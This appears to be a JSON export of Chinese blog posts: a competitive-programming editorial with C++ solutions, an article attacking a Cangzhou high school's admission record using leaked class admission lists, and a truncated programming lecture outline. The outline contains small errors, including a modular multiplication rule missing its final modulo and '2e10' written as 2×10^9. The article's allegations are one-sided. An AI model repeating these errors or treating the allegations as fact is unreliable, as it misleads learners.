v_=min(m-1,r%n);//判断余下的块长度，如果余下的块长比m-1还大，那么就取m-1即可，因为第m个数开始为0\n\t\tv+=v_*(v_+1)/2;v%=mod;//这里用了求和公式\n\n        //同理\n\t\tint u=l/n*sum%mod;\n\t\tint u_=min(m-1,l%n);\n\t\tu+=u_*(u_+1)/2;u%=mod;\n\t\t//\n\t\tcout<<(v-u+mod)%mod<<endl;\n\t}\n\treturn 0;\n}\n```\n\n以上代码可通过全部测试点，期望得分 $100pts$。\n\n以下是其他验题人的代码：\n\n王添翼\n\n```cpp\n#include<iostream>\n#include <typeinfo>\n#include<string>\n#define int long long\nusing namespace std;\n\nconst int p = 19260817;\n\nint guss( int l , int r ){\n    return ((l+r)*(r-l+1)/2) %p;\n}\n\nsigned main(){\n    int t;\n    cin >> t;\n    int l , r , m , n;\n    while( t -- ){\n        cin >> l >> r >> m >> n;\n        int ans = 0;\n        int z = r/n - l/n;\n\n        if( z ){\n            int lm = l % n , rm = r % n;\n            if( lm < m ){\n                ans += guss( lm , m-1 ) % p;\n                ans %= p;\n            }\n            ans += (guss( 1 , m-1 ) * (z-1) % p);\n            ans %= p;\n            ans += (guss( 1 , min( rm , m-1 ) ) %p);\n            ans %= p;\n        }\n        else{\n            ans += (guss( l % n , min( r%n , m-1 ) )%p);\n            ans %= p;\n        }\n        ans %= p;\n        cout << (ans>0?ans:0) << endl;\n    }\n    return 0;\n}\n```\n\n赵玉航\n\n```cpp\n#include<bits/stdc++.h>\n#define MAXN 1000010\n#define int long long\n#define raed() read()\n#define mp(x,y) make_pair(x,y)\n#define rep(i,l,r) for(int i=l;i<=r;i++)\n#define per(i,l,r) for(int i=l;i>=r;i--)\n#define lowbit(x) (x&(-x))\n#define ls(x) (x<<1)\n#define rs(x) (x<<1|1)\n#define inf 0x3f3f3f3f\n#define mod (int)(19260817)\n#define PI 3.1415926535\n#define test(s) freopen(\"s\",\"r\",stdin);\n#define endl \"\\n\"\nusing namespace std;\nint a[MAXN];\nint n;\ninline void solve(int wtf)\n{\n\tint l,r,m,n;\n\tint u,v;\n\tcin>>l>>r>>m>>n;\n\tint sum1=0;\n\tint sum2=0;\n\tu=(r+1)/n;\n\tv=(r+1)%n;\n\tsum1=u*(0+m-1)*m/2%mod+(0+min(m-1,v-1))*min(m,v)/2%mod;\n\tl--;\n\tswap(l,r);\n\tu=(r+1)/n;\n\tv=(r+1)%n;\n\tsum2=u*(0+m-1)*m/2%mod+(0+min(m-1,v-1))*min(m,v)/2%mod;\n\tcout<<((sum1-sum2)%mod+mod)%mod<<endl;\n\treturn;\n}\nsigned main()\n{\n\tint T=1;\n\tios_base::sync_with_stdio(false);\n\tcin.tie(0);\n\tcin>>T;\n\trep(i,1,T)\n\t    solve(i);\n\treturn 0;\n}\n```\n\n路浩祥\n\n```cpp\n#include <iostream>\n#define ll long long\nusing namespace std;\nconst ll inf = 19260817;\nll sum(ll start, ll end)\n{\n\treturn ((start + end) * (end - start + 1) / 2) % inf;\n}\nint main()\n{\n\tios_base::sync_with_stdio(false);\n\tint t;\n\tcin >> t;\n\twhile (t--)\n\t{\n\t\tll l, r, m, n;\n\t\tcin >> l >> r >> m >> n;\n\t\tif (l>=m&&r<=n)\n\t\t{\n\t\t\tcout<<0<<endl;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tll ans = 0, k = r / n - l / n;\n\t\t\tif (k > 0)\n\t\t\t{\n\t\t\t\tll lm = l % n, rm = r % n;\n\n\t\t\t\tif (lm < m)\n\t\t\t\t{\n\t\t\t\t\tans += sum(lm, m - 1) % inf;\n\t\t\t\t\tans %= inf;\n\t\t\t\t}\n\t\t\t\tans += (sum(1, m - 1) * (k - 1) % inf);\n\t\t\t\tans %= inf;\n\t\t\t\tans += sum(1, min(rm, m - 1)) % inf;\n\t\t\t\tans %= inf;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tans += sum(l % n, min(r % n, m - 1)) % inf;\n\t\t\t\tans %= inf;\n\t\t\t}\n\t\t\tcout << ans% inf << endl;\n\t\t}\n\t}\n\treturn 0;\n}\n```\n\n## T4 填数游戏\n\n### 概览\n\n本题直接从正面考虑，难度是很大的。实际上，本题需要选手根据测试点的特殊性质，先考虑特殊情况如何解决，从而想出一般情况的解决方法。\n\n需要选手有很高的思维水平和一定的代码能力。\n\n难度：<span style=\"color:rgb(82,196,26)\">普及+/提高</span>。题目可以放在NOIP的第一题位置，作为难度不低的题目。\n\n详细考察点：C++基本语法、前缀和算法、贪心算法、时间复杂度分析\n\n### 算法一\n\n当 $n=4$ 是，填数总共就这么几个情况：\n\n- 1234\n- 1243\n- 1324\n- 1342\n- 1423\n- 1432\n- 2134\n- 2143\n- 2341\n- 2314\n- 2413\n- 2431\n- 4123\n- 4132\n- ....\n\n（好吧，确实情况比较多，总共有 $24$ 种情况\n\n你把每种情况都计算一下分数，最后输出最多的那个即可\n\n代码略，上述做法可以通过测试点 $1\\sim 3$ ，期望得分 $12pts$。\n\n### 算法二\n\n其实你可以考虑枚举全排列，然后看哪种情况下分数最高。应该有大佬知道怎么枚举全排列。\n\n当然，这个我们课上没讲，这个是你之后学dfs的时候会学到，如果你不会的话就拿不到这个分数了。\n\n参考代码：\n\n```cpp\n#include<bits/stdc++.h>\nusing namespace std;\nint s[100005],p[100005];\nint main(){\n\tint n;cin>>n;\n\tfor(int i=1;i<=n;i++) cin>>s[i];\n\tfor(int i=1;i<=n;i++) p[i]=i;\n\tint ans=0;\n\tdo{\n\t\tint _ans=0;\n\t\tfor(int i=1;i<=n;i++){\n\t\t\tif(p[i]>i) _ans-=s[i];\n\t\t\tif(p[i]<i) _ans+=s[i];\n\t\t}\n\t\tans=max(ans,_ans);\n\t}while(next_permutation(p+1,p+n+1));\n\tcout<<ans;\n\treturn 0;\n}\n```\n\n以上代码可以通过测试点 $1\\sim 5$ ，期望得分 $20pts$\n\n### 算法三\n\n对于特殊性质 $AC$ ，我们很自然的想法就是如果每个格子都赚，即每个格子的分数都获得，那么答案应该是最优的。这也就意味着你必须给每个格子都填上一个比他编号小的数字。但你发现，格子 $1$ 永远是赚不了的。或者说，格子 $1$ 要么亏，要么不赚不亏。如果格子 $1$ 不赚不亏，那么就该轮到格子 $2$ 要么亏要么不赚不亏了。\n\n然后你继续考虑，如果格子 $1$ 亏了，后面的格子一定可以都赚。比如 $n=5$ 时，我们可以这么填：\n\n| 1   | 2   | 3   | 4   | 5   |\n| --- | --- | --- | --- | --- |\n| 5   | 1   | 2   | 3   | 4   |\n\n这样一定是最优答案。\n\n所以我们只需要让一个格子亏，剩余格子都赚。参考代码：\n\n```cpp\n#include<bits/stdc++.h>\nusing namespace std;\nint s[100005],p[100005];\nint main(){\n\tint n;cin>>n;\n\tfor(int i=1;i<=n;i++) cin>>s[i];\n\tint ans=s[1]*(n-1)-s[1];\n\tcout<<ans;\n\treturn 0;\n}\n```\n\n以上代码可以通过测试点 $6\\sim 7$ 和 $14\\sim 15$ 。期望得分 $16pts$。\n\n### 算法四\n\n对于特殊性质 $C$ ，我们的想法和算法三差不多，只不过这次可能直接让格子 $1$ 亏掉其他格子都赚，这样不一定能获得最高分数。因为可能你格子 $1$ 亏掉的分数太多了，得不偿失。\n\n但是格子 $1$ 还是要么亏，要么不赚不亏。既然亏了可能不好，那我们就考虑格子 $1$ 不赚不亏。\n\n格子 $1$ 不赚不亏之后，我们实际上就可以忽略到格子 $1$，仅看格子 $2$ 到 $n$ 了，格子 $2$ 也会有一模一样的顾虑，有可能格子 $2$ 亏掉的分也太多了，即使格子 $3$ 到格子 $n$ 都是赚的，也得不偿失。所以你也要考虑是不是格子 $2$ 也要不赚不亏。\n\n然后就这么一直考虑下去....\n\n参考代码：\n\n```cpp\n#include<bits/stdc++.h>\nusing namespace std;\nint s[100005];\nint main(){\n\tint n;cin>>n;\n\tfor(int i=1;i<=n;i++) cin>>s[i];\n\tint ans=0;\n\tfor(int i=1;i<=n;i++){\n\t\t//枚举第i个格子开始亏了，第i个格子之前的格子都是不赚不亏的，第i个格子之后的格子都是赚的\n\t\tint _ans=0;\n\t\t_ans-=s[i];\n\t\tfor(int j=i+1;j<=n;j++){\n\t\t\t_ans+=s[j];\n\t\t}\n\t\tans=max(ans,_ans);\n\t}\n\tcout<<ans;\n\treturn 0;\n}\n```\n\n以上代码时间复杂度为 $O(n^2)$ 可以通过测试点 $6\\sim 9$，期望得分 $16pts$。\n\n实际上，你内层循环是没必要的，可以使用类似于前缀和的优化，但在这题中，准确来说是后缀和。\n\n我们令 $suf[i]$ 为从 $s[n]$ 一直加到 $s[i]$ （注意是倒着加的），直接把内层循环替换为 $_ans+=suf[i+1]$ 即可。\n\n参考代码：(注意从现在开始就要开long long了)\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\nusing namespace std;\nint s[100005],suf[100005];\nsigned main(){\n\tint n;cin>>n;\n\tfor(int i=1;i<=n;i++) cin>>s[i];\n\tint ans=0;\n\tfor(int i=n;i>=1;i--){\n\t\tsuf[i]=suf[i+1]+s[i];\n\t}\n\tfor(int i=1;i<=n;i++){\n\t\tint _ans=0;\n\t\t_ans-=s[i];\n\t\t_ans+=suf[i+1];\n\t\tans=max(ans,_ans);\n\t}\n\tcout<<ans;\n\treturn 0;\n}\n```\n\n以上代码时间复杂度为 $O(n)$，可以通过测试点 $6\\sim 9$ 和 $14\\sim 15$ 和 $18\\sim 19$。期望得分 $32pts$。\n\n### 算法五\n\n考虑特殊性质 $B$，如果 $s$ 序列是从一个正数开始单调递增，那么所有格子的分数都为正数，这个我们已经考虑过了。如果从一个负数开始单调递增，我们又分成两种情况\n\n- 序列都是负数\n- 序列先负后正\n\n都是负数的话好说，我们希望所有的格子都要是亏的，但发现最后一个格子要么不亏不赚，要么赚，后面的讨论就和算法四是一样的了。这回我们可能需要个 $pre[i]$ 表示从 $s[1]$ 正着加到 $s[i]$。\n\n参考代码：\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\nusing namespace std;\nint s[100005],pre[100005];\nsigned main(){\n\tint n;cin>>n;\n\tfor(int i=1;i<=n;i++) cin>>s[i];\n\tint flag=0;//判断是不是所有数字都为负数\n\tfor(int i=1;i<=n;i++){\n\t\tif(s[i]>0){\n\t\t\tflag=1;\n\t\t\tbreak;\n\t\t}\n\t}\n\tif(flag==0){\n\t\tint ans=0;\n\t\tfor(int i=1;i<n;i++){\n\t\t\tpre[i]=pre[i-1]+s[i];\n\t\t}\n\t\tfor(int i=1;i<=n;i++){\n\t\t\tint _ans=s[i];\n\t\t\t_ans-=pre[i-1];\n\t\t\tans=max(ans,_ans);\n\t\t}\n\t\tcout<<ans;\n\t}else{\n\n\t}\n\treturn 0;\n}\n```\n\n如果序列是先负后正呢？我宣称，这种情况下你一定可以找到一个填数方案，让分数为负的格子亏了，让分数为正的格子赚了，不信的话给你举个例子。\n\n假如 $s$ 序列长这样：`-5 -3 2 4 5`，我们这样填：\n\n| 1   | 2   | 3   | 4   | 5   |\n| --- | --- | --- | --- | --- |\n| 4   | 5   | 1   | 2   | 3   |\n\n再来，加入 $s$ 序列为 `-5 -4 -3 -2 1 3`，我们这样填\n\n| 1   | 2   | 3   | 4   | 5   | 6   |\n| --- | --- | --- | --- | --- | --- |\n| 3   | 4   | 5   | 6   | 1   | 2   |\n\n你只需要先从第一个正数那里填 $1$ 即可。\n\n这种情况下，直接把所有数的绝对值相加即可。\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\nusing namespace std;\nint s[100005],pre[100005];\nsigned main(){\n\tint n;cin>>n;\n\tfor(int i=1;i<=n;i++) cin>>s[i];\n\tint flag=0;//判断是不是所有数字都为负数\n\tfor(int i=1;i<=n;i++){\n\t\tif(s[i]>0){\n\t\t\tflag=1;\n\t\t\tbreak;\n\t\t}\n\t}\n\tif(flag==0){\n\t\tint ans=0;\n\t\tfor(int i=1;i<n;i++){\n\t\t\tpre[i]=pre[i-1]+s[i];\n\t\t}\n\t\tfor(int i=1;i<=n;i++){\n\t\t\tint _ans=s[i];\n\t\t\t_ans-=pre[i-1];\n\t\t\tans=max(ans,_ans);\n\t\t}\n\t\tcout<<ans;\n\t}else{\n\t\tint ans=0;\n\t\tfor(int i=1;i<=n;i++) ans+=abs(s[i]);\n\t\tcout<<ans;\n\t}\n\treturn 0;\n}\n```\n\n以上代码可通过测试点 $10\\sim 11$ 和 $16\\sim 17$ 期望得分 $16pts$。\n\n### 算法六（正解）\n\n实际上，并不需要分数序列单调递增，只需要分数序列是先负后正，就有算法五最后的神奇性质。\n\n然后这个性质还能推广，也不一定是整个序列先负后正，序列的一部分是先负后正，这一部分就可以获得最大分数。\n\n我们只考虑序列正负，对于任意 $s$ 序列，都是这种分布：全正——负正交替——全负。不信？举几个例子，比如 `1 2 -3 -4 5 -6 7 -8 9 10 -11 -12` 那么就可以分成这样 `(1 2)(-3 -4 5)(-6 7)(-8 9 10)(-11 -12)`。\n\n中间三个部分直接绝对值相加即可，就是首尾的全正和全负序列有点棘手。\n\n不过事实上，全正和全负的情况，我们在算法四和算法五已经说过怎么解决了。\n\n参考代码：\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\nusing namespace std;\nint s[100005],n,ans,pre[100005],suf[100005];\nsigned main(){\n\tcin>>n;\n\tfor(int i=1;i<=n;i++) cin>>s[i];\n\tint l=0,r=n+1;\n\twhile(s[l+1]>0 && l+1<=n) l++; //找到前面全正部分的最后位置\n\twhile(s[r-1]<0 && r-1>=1) r--; //找到后面全负部分的最靠前位置\n\tfor(int i=l+1;i<=r-1;i++) ans+=abs(s[i]); //中间直接绝对值相加\n\tfor(int i=l;i>=1;i--) pre[i]=pre[i+1]+s[i]; //预处理前缀和后缀\n\tfor(int i=r;i<=n;i++) suf[i]=suf[i-1]-s[i];\n\tint _ans;\n\t_ans=0;\n\tfor(int i=1;i<=l;i++) _ans=max(_ans,-s[i]+pre[i+1]); //类似算法四\n\tans+=_ans;\n\t_ans=0;\n\tfor(int i=n;i>=r;i--) _ans=max(_ans,s[i]+suf[i-1]);  //类似算法五\n\tans+=_ans;\n\tcout<<ans;\n\treturn 0;\n}\n```\n\n其他验题人代码\n\n范铭轩\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\nusing namespace std;\nconst int N = 1000005;\nint a[N],ans,tot,cnt;\n\nsigned main(){\n\tint n;\n\tcin>>n;\n\tfor(int i = 1;i <= n;++ i) cin>>a[i];\n\tint l = 1,r = n;\n\tbool flag = false;\n\twhile(l <= n && a[l] > 0){\n\t\ttot += a[l];\n\t\tflag = true;\n\t\tl ++;\n\t}\n\tif(flag) tot -= (a[1] << 1);\n\tfor(int i = 1;i < l - 1;++ i){\n\t\tcnt = max(cnt,tot);\n\t\ttot += a[i];\n\t\ttot -= (a[i + 1] << 1);\n\t}\n\tans += cnt;\n\ttot = 0,cnt = 0;\n\tflag = false;\n\twhile(r >= 1 && a[r] < 0){\n\t\ttot -= a[r];\n\t\tflag = true;\n\t\tr --;\n\t}\n\tif(flag) tot += (a[n] << 1);\n\tfor(int i = n;i > r + 1;-- i){\n\t\tcnt = max(cnt,tot);\n\t\ttot -= a[i];\n\t\ttot += (a[i - 1] << 1);\n\t}\n\tans += cnt;\n\tfor(int i = l;i <= r;++ i) ans += abs(a[i]);\n\tcout<<ans;\n\treturn 0;\n}\n```\n\n路浩祥\n\n```cpp\n#include <bits/stdc++.h>\n#define int long long\nusing namespace std;\nint t,n,r,c[200005];\nint a,b;//标记分3段\nsigned main()\n{\n\tmemset(c,0,sizeof(c));\n\tn=r=0;\n\tcin>>n;\n//\t\tfor (int i=1;i<=n;i++)cin>>r;\n\tfor (int i=1;i<=n;i++) scanf(\"%lld\",&c[i]);\n\t//分段\n\ta=0,b=n+1;\n\twhile(c[a+1]>0) a++;\n\twhile(c[b-1]<0) b--;\n\t//第一段（排名高且想进步）\n\tint ans1=0,sum=0;\n\tfor (int i=a;i>1;i--)\n\t{\n\t\tsum+=abs(c[i]);\n\t\tans1=max(ans1,sum-abs(c[i-1]));\n\t}\n\t//第二段（有进有退）\n\tint ans2=0;\n\tfor (int i=a+1;i<=b-1;i++)  ans2+=abs(c[i]);\n\t//第三段（排名低且想退步）\n\tint ans3=0;sum=0;\n\tfor (int i=b;i<n;i++)\n\t{\n\t\tsum+=abs(c[i]);\n\t\tans3=max(ans3,sum-abs(c[i+1]));\n\t}\n\tprintf(\"%lld\\n\",ans1+ans2+ans3);\n\treturn 0;\n}\n```\n\n","summary":"本篇文章是举行在2024年8月18日的 CZSC2024第一次 的题解","key":["czoi"],"tags":[],"path":["算法竞赛","CZOI","CZSC2024","CZSC 2024 第一次 题解.md"],"background":"https://www.caiwen.work/czoi2024.jpg","recommend":false,"status":"published"},{"type":"Article","title":"沧州市第一中学：三个清北光辉的背后","id":"fuck-cangzhouyizhong","createTime":"2024-08-08T14:35:00.000Z","updateTime":"2025-09-05T13:34:04.827Z","content":"\n## 前言\n\n本文为 2024 年写成的经典文章。文章发出后，沧州市第一中学立刻联系网信办对文章进行下架。原投稿至 “望沧州” 公众号，其运营者不敢再发布本文章：\n\n![沧一公关将本文从微信公众号中删除](https://www.caiwen.work/wp-content/uploads/2024/08/1.webp)\n\n且在知乎平台的文章被屏蔽，无法被查看，这些足以见得本篇文章的含金量！\n\n在 2025 年，笔者再次对文章进行整理，并添加部分 2025 年沧州一中高考情况，以及其他内容，再次发表。希望本文的存活时间可以更久一点（领导同志们别再联系网信办了，球球了）\n\n特别声明：本文无恶意抹黑，只是希望学校能正视自身问题。正视问题才能更好地改正！真相是无法被掩盖的！\n\n## 2025 年高考数据\n\n2025 年高考出分之后，沧州一中死一般的寂静。不过随后还是勉强挤出一篇喜报，声称有三个清北，似乎续写了去年的战绩。一个月后，录取结果公布，沧州一中今年的战绩如何呢？\n\n老规矩，先来喜报：\n\n![](http://pic.caiwen.work/i/2025/07/27/6885984681e63.jpg)\n\n然后我们来看我们沧州市最好的高中的喜报：\n\n![](http://pic.caiwen.work/i/2025/07/27/6885982037850.jpg)\n\n前后两者的差距一目了然，甚至沧一喜报都没把学生的名字写出来，但去年写了（大概是因为文科第一是北大班的并非领军班，是沧一非预期的。理科第一在之前并非考过全校第一，也是沧一非预期的。而我们的沧州一中只在乎全校第一）。搞笑的是前者说根据规定不允许宣传排名情况，后者光明正大的宣传，打脸来的如此之快。\n\n俗话说的好，七分考三分报，那么沧一的录取情况应该很好吧。\n\n由于本文去年的影响力，沧一已经严格保密录取结果：\n\n![](http://pic.caiwen.work/i/2025/07/27/68859579ebe42.jpg)\n\n但是笔者还是通过特殊手段获得了一些数据（建议校领导下一年考虑班主任逐个打电话询问的方式，可确保数据不会被泄露（笑））。\n\n理科领军班有两个，其中 33 班录取结果如下：\n\n![](http://pic.caiwen.work/i/2025/07/27/6885951234d0e.png)\n\n领军班 32 班录取结果如下（最高分并没有去清华核物理以及清北强基，而是选择复旦大学工科试验班）：\n\n![](http://pic.caiwen.work/i/2025/07/27/6885f5a7bcf9f.png)\n\n![](http://pic.caiwen.work/i/2025/07/27/6885f5fd931c9.png)\n\n另一个领军班，诞生了今年全校最高分，但是并没有顺从沧一，选择清华大学核物理，而是选择复旦大学工科实验班。总的来说，今年沧一物理系列没有清北，有人该着急了。\n\n物化地组合北大班 30 班录取结果如下：\n\n![](http://pic.caiwen.work/i/2025/07/27/6885ebcd1e9a9.png)\n\n![](http://pic.caiwen.work/i/2025/07/27/6885ec059dbc5.png)\n\n物化生组合北大班 29 班录取结果如下：\n\n![](http://pic.caiwen.work/i/2025/07/27/6885d6f413ad6.png)\n\n![](http://pic.caiwen.work/i/2025/07/27/6885d72730e65.png)\n\n另一个物化生组合北大班 26 班只有前 7 名的数据，具体如下：\n\n![](http://pic.caiwen.work/i/2025/07/27/6885d818ed315.png)\n\n还有另一个同学也是吉林大学，因此一共是 5 个 985\n\n物化生组合北大班 28 班录取结果如下，下表按高考成绩从高到低排序，其中 985 有 1 人，211 有 17 人：\n\n![](http://pic.caiwen.work/i/2025/07/27/6885ecfd57a65.png)\n\n对于珍珠班，笔者也得到了一些数据。为了给沧一校领导一点脸面，这里暂时不公布具体数据，只泛泛而谈。\n\n珍珠班一 985 共 0 人，211 共 4 人，双一流 1 人，其余均双非院校，其中很多录取学校都是“某某学院”，至少两人复读。\n\n珍珠班二 985 共 0 人，211 共 3 人，双一流 1 人，其余均双非院校。\n\n珍珠班三 985 共 0 人，211 共 8 人，双一流 0 人，其余均双非院校，至少四人复读。\n\n珍珠班四 985 共 1 人（兰州大学），211 共 5 人，双一流 1 人，其余均为双非院校（统计少 11 人数据，不过应该不影响太多）。\n\n珍珠班五 985 共 0 人，211 共 6 人，双一流 0 人，其余均为双非院校。\n\n概览：\n\n![](http://pic.caiwen.work/i/2025/07/27/6885fa726a928.png)\n\n民间有说法：沧一三个年级部，三年一轮，20 级年级部最好，21 级年级部中等，22 级年级部最差，似乎再次灵验。今年的成绩依然是 22 级年级部最好的一年，因为他们带的 19 级（2022 年高考）最高分只去了同济大学。\n\n说句实在的，笔者也是对事不对人，对于上述成绩，我认为比 2024 年高考好一些，沧一还是有所进步，不吹不黑。\n\n下面是经过再次修订的去年的文章内容：\n\n## 2024 年正文\n\n利益相关：2024届北大班学生\n\n先上2024年沧州市第一中学的官方喜报\n\n![只敢宣传最高成绩](https://www.caiwen.work/wp-content/uploads/2024/08/1719828379916.jpg)\n\n![对物理系列笔墨不多](https://www.caiwen.work/wp-content/uploads/2024/08/1719828386213.jpg)\n\n而以上看似光辉背后，是什么呢？\n\n理科领军班 35 班，32 人，17 个 985，13 个 211，1 人去河北衡水中学（滏阳校区）复读。\n\n![](http://pic.caiwen.work/i/2025/07/26/6884dd34d7e5b.png)\n\n理科北大班 34 班，具体录取结果如下，其中 2 人复读，未出现在名单中。\n\n![](http://pic.caiwen.work/i/2025/07/26/6884e3399be7d.png)\n\n![](http://pic.caiwen.work/i/2025/07/26/6884e353d72a0.png)\n\n附：“蹭饭图”\n\n![（为保护隐私，已将姓名打码）](https://www.caiwen.work/wp-content/uploads/2024/08/v2-b974184130c1ed7f29720f780b42fb79_1440w.jpeg)\n\n理科北大班 33 班，录取结果如下，其中 1 人复读，未出现在名单中：\n\n![](http://pic.caiwen.work/i/2025/07/26/6884e8522505d.png)\n\n![](http://pic.caiwen.work/i/2025/07/26/6884e876bc006.png)\n\n![](http://pic.caiwen.work/i/2025/07/26/6884e9fd3f7cc.png)\n\n理科北大班 32 班，共 40 人，3 个 985，12 个 211，6个复读。其中三个985为四川大学，兰州大学，中国海洋大学。我们并没有得到具体的录取数据。\n\n概览：\n\n![](http://pic.caiwen.work/i/2025/07/26/6884eaa0bd57d.png)\n\n作为对比，这是泊头一中的录取结果，光明正大，主动公布：\n\n![](https://www.caiwen.work/wp-content/uploads/2024/08/A0BC80ECB7661809D0E41689CD8BA995.jpg)\n\n众所周知，这三个北大班和唯一的领军班都是物化生组合，在教学楼的四楼，是全校最重点的四个班级，能在一定程度上代表沧一的最高水平。且领军班是将全校前30人抽取出来组成的新的班级。\n\n我们暂且不讨论这些顶尖学生。我们光是看北大班的学生，中上流，复读人数甚至追赶985人数。而其他班级呢？珍珠班呢？实验班呢？我们只知道珍珠班600分以上屈指可数，实验班一本的屈指可数。\n\n你可能只看到了这几个冷冰冰的数据，到这背后，是200名在3年前出于各种原因，没能走出沧州的优秀学生，在未来可能十几年的命运。\n\n某北大班班主任透露，高考出分的那天晚上自己整晚都没睡好。\n\n大多数人，高考分还没中考分高。更多的，甚至原来中考不如自己分高的去外地上学的人，高考分反而比自己高。\n\n然而校领导是非常开心的，破天荒的3个清北，虽然一个核物理定向生，一个马克思主义提前批，但好歹也是清北。又可以吹嘘所谓的一中力量了，只在乎清北人数。但你们，如何给剩下这群被沧一毁掉的学生一个交代呢？我们的青春如何来弥补呢？\n\n若干年后，当这一届高考生通过考研扭转自己高考劣势后，校领导又会笑着说“沧一的学生后劲足啊”\n\n## 后记\n\n这样的录取结果出来之后，21 级年级部的主任几乎全员下马，均不再继续担任 24 级的年级部的主任。\n\n本文在去年发表之后，据 24 级的新生透露，沧州一中的老师们知道我的身份，并对我进行了人身攻击。\n\n这一届去衡水复读的学生，大多在 25 年高考取得很好的成绩，去到了一个还算满意的大学。据我身边去衡水复读的同学所讲，无论是衡中还是武邑，他们的教学质量完全不是沧一能比的，对比来看，沧一就像是一个大山里的学校，毫无教学质量可言。确实，沧一无论是教学质量还是学生管理，都存在重大问题，就像一艘失去罗盘的渡船，载着沧州市区最优秀的孩子们，在名为‘教育’的暗流中盲目打转——而岸边的未来，正一寸寸沉入迷雾。\n\n","summary":"2024年高考录取结果后，沧州市第一中学破天荒出了三个清北。而这看似光辉的背后，又是什么呢？","key":["沧州一中","985","北大班","沧州","清北","第一中学"],"tags":[{"value":"经典文章","color":"success"}],"path":["沧州市第一中学：三个清北光辉的背后.md"],"background":"https://www.caiwen.work/wp-content/uploads/2024/08/未命名2.jpg","recommend":true,"status":"published"},{"type":"Article","title":"四. 时间与空间","id":"czsc2024-class4","createTime":"2024-08-08T06:01:00.000Z","updateTime":"2025-09-05T13:34:06.426Z","content":"\n::: info 说明\n本文为 沧州市第一中学信息学竞赛夏令营（CZSC2024） 第四次课程的课程大纲\n:::\n\n## 0. 数学符号扫盲\n\n- $\\left \\lfloor x \\right \\rfloor $ ：向下取整\n- $\\left \\lceil x \\right \\rceil $ ：向上取整\n- $\\left [ x \\right ] $ ：向下取整\n- $\\sum_{i=1}^{n} i$ ：$i$ 从 $1$ 开始增长到 $n$ ，然后都给加起来\n- $\\sum_{i=l}^{r} i^3$ ：$i$ 从 $l$ 开始增长到 $r$ ，然后把三次方都给加起来\n- $\\sum_{i=l}^{r} 2i+3 $ ：相当于 $(2l+3) + (2(l+1)+3) + (2(l+2)+3)+...+(2(r-1)+3)+(2r+3)$\n- $\\prod_{i=1}^{n}i$ ：相加改为相乘\n\n## 1. 数据类型的范围\n\n- 数据类型存在取值范围\n- `int`\n  - 最大存储 $2^{31}-1$\n  - 最小存储 $-2^{31}$\n- `long long`\n  - 最大存储 $2^{63}-1$\n  - 最小存储 $-2^{63}$\n- 数字还大？视为字符串存储，计算使用高精度算法\n\n## 2. 取模的性质\n\n由于某些题目的计算结果可能超出了long long的范围，而且高精度算法很难写，所以很多题目要求我们将计算结果取模后再输出。\n\n- $a\\% b$ 的结果取值范围为 $0$ 到 $b-1$\n  - 因此我们可以通过取模把所有的整数不重不漏分类\n  - 一个数取模之后可以保证结果不会比模数还要大\n- $(a+b)\\%p=(a\\%p+b\\%p)\\%p$\n- $(a*b)\\%p=a\\%p*b\\%p$\n- $(a-b)\\%p=(a\\%p-b\\%p+p)\\%p$\n  - 为什么要加p模p？因为我们防止出现负数\n    - 如 $(7-5)\\%3$ 显然是 $2$\n    - 而 $7\\%3=1$ ，$5\\%3=2$\n    - 你可以考虑一下 $(a+b)\\%b$\n- 除法？没有类似的，需要逆元\n\n## 3. 空间限制\n\n- 你开的所有变量都是占用内存的\n- 使用sizeof函数可以查看占用内存情况\n- 语法：`sizeof(a)` 可以看到变量 $a$ 占用内存。函数返回一个int，表示变量占用内存，单位字节\n  - `sizeof(a)/1024` 单位kb\n  - `sizeof(a)/1024/1024` 单位mb\n\n来个题目\n\nT217223 https://www.luogu.com.cn/problem/T217223\n\n- oi中的科学计数法：$1e9=10^9$ , $2e10=2\\times 10^9$，你可以在c++中直接这么表示\n  - 注意c++中的 `10^9` 不代表 $10^9$ 而是表示 $10$ 与 $9$ 进行异或运算\n\n- 运算过程中很有可能超出了int的范围，即使取模能让你的中间运算结果位于 $1e9+9$ 以内，但你发现两个 $1e9$ 的数字相乘会超出int范围，考虑使用long long\n- 把哪个变量变成long long？我建议你把所有变量都变成long long\n  1. 加入 `#define int long long` 代码\n  2. 把main函数的返回值数据类型改为 `signed`\n  3. 以后做题最好是都 `#define int long long` 确保万无一失\n- 但long long类型的内存占用大，你需要注意一点题目的空间限制\n- 注意，这种取模的题，每次运算都要取模！一个地方没取模就有可能寄\n- mle了？考虑是不是数组有点多余了\n\n## 4. 前缀和\n\n解锁我们的第二个算法\n\n（不带修改的区间询问）https://www.luogu.com.cn/problem/U156243\n\n- 直接暴力\n  - 处理单次询问时间复杂度 $O(n)$\n  - 共 $m$ 次询问，总的时间复杂度为 $O(mn)$ ，无法通过\n- 令 $sum[i]=sum[i-1]+a[i]$ ，对于 $[l,r]$ 的询问，直接输出 $sum[r]-sum[l-1]$ 即可\n  - 预处理时间复杂度 $O(n)$\n  - 处理单次询问时间复杂度 $O(1)$\n  - 共 $m$ 次询问，总的时间复杂度为 $O(m+n)$ ，跑的飞快！\n\n- 类似前缀和的思想\n  - 从 $1$ 到 $n$ 加起来，公式为 $\\frac{n(n+1)}{2}$\n  - 从 $l$ 加到 $r$ 呢？\n\n## 5. 语法扫尾\n\n- if、while、for语句在花括号中仅有一行代码时可以简写，省略花括号\n- c++中，`0` 就代表false，除 `0` 以外的数字都代表 true，可用于简化条件\n\n```cpp\nif(a!=0){\n\tx++;\n}\n```\n\n```cpp\nif(a) x++;\n```\n\n- 常量：在定义变的时候加 `const` ，如 `const int mod=1e9+9` 即可定义一个常量。常量不能被改变\n  - 一般开成全局变量\n  - `#define mod 1000000009` 也有类似效果，但这里就不建议使用 $1e9+9$ 了\n  - 准确来说不建议使用 $1e9+9$ 这种形式，因为有学长因为这个爆零过...\n  - 一般来说，数组长度和模数都定义成常量，这样我更改一处，所有地方都能跟着改变\n\n```cpp\n#define _ 1000006\nint arr[_];\n```\n\n- 一些数学函数\n  - `sqrt(a)` ：开方，返回double类型数据\n  - `abs(a)`：给整数取绝对值\n  - `fabs(a)`：给浮点数取绝对值\n- 如何比较两个double类型相等？\n\n```cpp\nconst double 